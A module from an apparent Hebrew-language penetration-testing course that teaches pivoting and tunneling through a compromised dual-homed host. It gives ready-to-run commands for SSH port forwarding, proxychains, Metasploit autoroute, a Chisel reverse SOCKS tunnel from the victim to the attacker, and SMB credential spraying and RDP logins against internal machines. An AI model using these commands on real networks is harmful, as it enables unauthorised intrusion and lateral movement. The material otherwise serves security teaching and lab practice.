<div dir="rtl">

> 📘 **הכול בגלילה אחת:** [**כל החומר של המודול בקובץ אחד**](כל-החומר.md) — חומר לימוד, תרגילים, תרגול ופתרונות, ברצף.

# מודול 12 — Pivoting ותנועה רוחבית (Pivoting & Tunneling)

> **מטרות המודול:** להבין כיצד עוברים **ממכונה שנפרצה אל הרשת הפנימית** שמאחוריה. נלמד **Pivoting** (שימוש במכונה שנפרצה כ"גשר"), **Port Forwarding**, **SSH Tunneling**, ו-**Proxying** (proxychains) — כדי להגיע למכונות שאינן חשופות ישירות לתוקף. זהו הצעד שהופך פריצה של מכונה בודדת ל**פריצה של רשת**.
>
> **קבצים:** `README.md` · [`missions.md`](missions.md) · [`solutions.md`](solutions.md) · [`practice.md`](practice.md) · [`slides.md`](slides.md).

> **למה זה חשוב?** ברשתות אמיתיות, המכונה שפרצת אליה היא כמעט אף פעם לא היעד הסופי. השרתים הרגישים (Domain Controller, מסדי נתונים) יושבים ב**רשת פנימית** שלא נגישה אליך ישירות. Pivoting הוא **המפתח** לחצות פנימה.

---

## תוכן העניינים
1. [מהי תנועה רוחבית ו-Pivoting](#121-מהי-תנועה-רוחבית-ו-pivoting)
2. [התרחיש הטיפוסי (Dual-Homed Host)](#122-התרחיש-הטיפוסי-dual-homed-host)
3. [SSH Tunneling — שלושת הסוגים](#123-ssh-tunneling--שלושת-הסוגים)
4. [Proxychains ו-Dynamic Forwarding](#124-proxychains-ו-dynamic-forwarding)
5. [Pivoting עם Metasploit](#125-pivoting-עם-metasploit)
6. [כלים ייעודיים: Chisel ו-Ligolo](#126-כלים-ייעודיים-chisel-ו-ligolo)
7. [סריקה ותקיפה דרך ה-Pivot](#127-סריקה-ותקיפה-דרך-ה-pivot)
8. [סיכום השיטות](#128-סיכום-השיטות)

---

## 12.1 מהי תנועה רוחבית ו-Pivoting

- **תנועה רוחבית (Lateral Movement)** — מעבר ממכונה שנפרצה למכונה אחרת באותה רשת, לרוב עם אישורים (credentials) שאספת (מודול 11).
- **Pivoting** — שימוש במכונה שנפרצה כ**נקודת מעבר (Pivot)** לניתוב תעבורה אל רשת שאינה נגישה לך ישירות.
- **Tunneling** — עטיפת תעבורה בתוך פרוטוקול אחר (למשל SSH) כדי לחצות גבולות רשת/Firewall.

> 🎯 הרעיון המרכזי: המכונה שפרצת "רואה" רשתות שאתה לא רואה. אנחנו **מנתבים** דרכה כדי להגיע לשם.

---

## 12.2 התרחיש הטיפוסי (Dual-Homed Host)

מכונה שנפרצה עם **שני ממשקי רשת**:
- `eth0` — `192.168.56.50` — רשת ה-DMZ (חשופה, כאן אתה).
- `eth1` — `10.10.10.5` — **רשת פנימית** (שרתים רגישים, לא נגיש לך).

```text
   [ Kali ]              [ Pivot נפרץ ]            [ רשת פנימית ]
 192.168.56.10  ──────►  192.168.56.50               10.10.10.20 (DC)
   (התוקף)               10.10.10.5    ──────►      10.10.10.30 (DB)
                        (שתי רשתות)                 (לא נגיש ישירות!)
```
אתה מגיע ל-`192.168.56.50` אבל **לא** ל-`10.10.10.0/24`. הפתרון: לנתב דרך ה-Pivot.

**איך מזהים רשת פנימית אחרי פריצה?**
```bash
ip a; ip route         # ממשקים ורשתות נוספות
arp -a                 # מכונות שכנות ידועות
cat /etc/hosts
```

---

## 12.3 SSH Tunneling — שלושת הסוגים

אם יש לך SSH על ה-Pivot (או אישורים אליו), SSH הוא כלי ה-Tunneling החזק ביותר.

### א. Local Port Forwarding (`-L`)
מביא שירות מהרשת הפנימית **אליך**:
```bash
ssh -L 8080:10.10.10.30:80 user@192.168.56.50
# עכשיו http://localhost:8080 ב-Kali = שרת ה-web הפנימי 10.10.10.30:80
```

### ב. Remote Port Forwarding (`-R`)
פותח פורט **על ה-Pivot** שמנתב אליך (שימושי כשהקורבן לא יכול להתחבר החוצה ישירות):
```bash
ssh -R 3389:127.0.0.1:3389 user@pivot
```

### ג. Dynamic Port Forwarding (`-D`) — הכי חזק
יוצר **SOCKS Proxy** — מנתב **כל** תעבורה דרך ה-Pivot:
```bash
ssh -D 9050 user@192.168.56.50
# עכשיו כל כלי שתפנה דרך SOCKS 127.0.0.1:9050 → רץ מתוך הרשת הפנימית
```

> 💡 `-D` הוא ה"סכין השוויצרי": פרוקסי דינמי אחד שדרכו מריצים nmap, דפדפן, כל כלי — כאילו אתה **בתוך** הרשת הפנימית.

---

## 12.4 Proxychains ו-Dynamic Forwarding

**proxychains** מכריח כל כלי לעבור דרך פרוקסי (למשל ה-SOCKS מ-`ssh -D`).

```bash
# הגדרה: /etc/proxychains4.conf → בסוף:
socks5 127.0.0.1 9050

# עכשיו כל כלי דרך proxychains רץ "מתוך" הרשת הפנימית:
proxychains nmap -sT -Pn 10.10.10.30
proxychains firefox http://10.10.10.20
proxychains crackmapexec smb 10.10.10.0/24
```

> ⚠️ **חובה `-sT` (TCP Connect) ב-nmap דרך proxychains** — סריקת SYN (`-sS`) לא עוברת בפרוקסי SOCKS. וגם `-Pn` (דלג על ping).

---

## 12.5 Pivoting עם Metasploit

אם קיבלת **Meterpreter** על ה-Pivot, יש דרך מובנית ונוחה:

```bash
# 1. הוסף route לרשת הפנימית דרך ה-session:
meterpreter > run autoroute -s 10.10.10.0/24
# או:  msf > route add 10.10.10.0/24 <session-id>

# 2. עכשיו מודולי Metasploit "רואים" את הרשת הפנימית:
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.30

# 3. פרוקסי SOCKS לכלים חיצוניים:
msf > use auxiliary/server/socks_proxy
msf > run
# ואז proxychains ← 127.0.0.1:1080
```

---

## 12.6 כלים ייעודיים: Chisel ו-Ligolo

כשאין SSH — כלים ייעודיים מקימים מנהרות מהירות:

### Chisel (מנהור מעל HTTP/WebSocket)
```bash
# ב-Kali (שרת):
./chisel server -p 8000 --reverse
# על הקורבן (client) — מקים reverse SOCKS:
./chisel client <kali>:8000 R:socks
# ← SOCKS על 127.0.0.1:1080 ב-Kali → proxychains
```

### Ligolo-ng (מודרני, מהיר, ממשק tun)
כלי הפייבוט המועדף היום — יוצר ממשק רשת וירטואלי שדרכו ניגשים לרשת הפנימית **ללא proxychains**, בביצועים גבוהים. מצוין למעבדות AD.

> 🔧 **Chisel** נפוץ מאוד ב-CTF/OSCP כי הוא בינארי יחיד, חוצה-פלטפורמות, ועובד מעל HTTP (עוקף Firewalls רבים).

---

## 12.7 סריקה ותקיפה דרך ה-Pivot

אחרי שהקמת מנהרה — עובדים על הרשת הפנימית כאילו אתה בתוכה:

```bash
# גילוי מכונות ברשת הפנימית:
proxychains nmap -sT -Pn -p 22,80,139,445,3389 10.10.10.0/24

# תקיפת שירות פנימי שהתגלה:
proxychains crackmapexec smb 10.10.10.20 -u users.txt -p pass.txt
proxychains xfreerdp /v:10.10.10.30 /u:admin /p:Password1

# חוזרים על מחזור התקיפה: recon → exploit → privesc → pivot שוב
```

**Double Pivot:** לעיתים צריך לפרוץ מכונה פנימית ואז לפייבוט **ממנה** לרשת עמוקה יותר — משרשרים מנהרות. זה נפוץ ברשתות ארגוניות מרובות-שכבות.

> 🎯 כל מכונה פנימית שנפרצת מרחיבה את "שדה הראייה" שלך. Pivoting חוזר = חדירה עמוקה יותר לרשת.

---

## 12.8 סיכום השיטות

| שיטה | מתי | פקודת מפתח |
|------|-----|-------------|
| **SSH -L** | להביא שירות בודד אליך | `ssh -L 8080:internal:80 user@pivot` |
| **SSH -R** | הקורבן לא יוצא החוצה | `ssh -R 3389:127.0.0.1:3389 user@kali` |
| **SSH -D** | פרוקסי דינמי מלא | `ssh -D 9050 user@pivot` + proxychains |
| **Metasploit** | יש Meterpreter | `run autoroute -s <net>` |
| **Chisel** | אין SSH, מעל HTTP | `chisel server/client ... R:socks` |
| **Ligolo-ng** | ביצועים / AD | ממשק tun, ללא proxychains |

---

## סיכום המודול

- **Pivoting** = שימוש במכונה שנפרצה כגשר לרשת פנימית לא-נגישה.
- מזהים רשת פנימית עם `ip a` / `ip route` / `arp -a`.
- **SSH Tunneling:** `-L` (local), `-R` (remote), `-D` (dynamic/SOCKS).
- **proxychains** מריץ כל כלי דרך הפרוקסי (זכור `-sT -Pn` ל-nmap).
- **Metasploit** (`autoroute`), **Chisel** ו-**Ligolo-ng** הם חלופות מצוינות.
- **Double Pivot** = שרשור מנהרות לחדירה עמוקה יותר — המפתח לתקיפת AD (מודול 13).

### מה הלאה?
➡️ [**תרגילים — `missions.md`**](missions.md) · [**פתרונות — `solutions.md`**](solutions.md) · [**תרגול ותרחישים — `practice.md`**](practice.md)
➡️ [**מודול 13 — Active Directory**](../13-active-directory/)

[⬅️ חזרה למפת הקורס](../../README.md)

</div>
